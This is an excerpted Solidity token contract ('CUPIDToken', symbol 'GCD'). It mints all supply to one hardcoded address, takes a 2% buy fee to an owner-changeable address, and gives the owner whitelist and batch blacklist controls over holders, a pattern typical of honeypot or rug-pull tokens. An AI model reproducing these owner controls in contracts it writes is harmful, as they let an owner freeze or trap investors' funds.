...
contract CUPIDToken is Context, IERC20Metadata, Ownable {
    ...
    uint256 private constant _totalSupply = 9600 * 10**18;
    string private _name = "GCD";
    string private _symbol = "GCD";
    uint8 private _decimals = 18;
    address public mainAddres = address(0x73d39b5E77da08a3b7A6B9D31855EF729Fd3BCE5);
    address public pointAddress = address(0x73d39b5E77da08a3b7A6B9D31855EF729Fd3BCE5);
    ...
    constructor() {
        ...
        _balances[mainAddres] = 9600 * 10**18;
    ...
    function updatePointAddress(address _pointAddress)external onlyOwner{
    ...
    function _transfer(
        ...
        if (!whiteLists[from]) {
            if (amount > balanceOf(from).mul(10000).div(10000)) {
        ...
        if (from == uniswapV2Pair && !whiteLists[to]){
            amount=amount.mul(98).div(100);
            uint256 subAmount=srcAmount.sub(amount);
            _balances[pointAddress] = _balances[pointAddress].add(subAmount);
            emit Transfer(from, pointAddress, subAmount);
        ...
        _balances[from] = _balances[from].sub(srcAmount, "ERC20: transfer amount exceeds balance");
    ...
    function setBlackListsMul(address[] memory _addrs, bool _result)
        public
        onlyOwner
    {
        for (uint256 i = 0; i < _addrs.length; i++) {
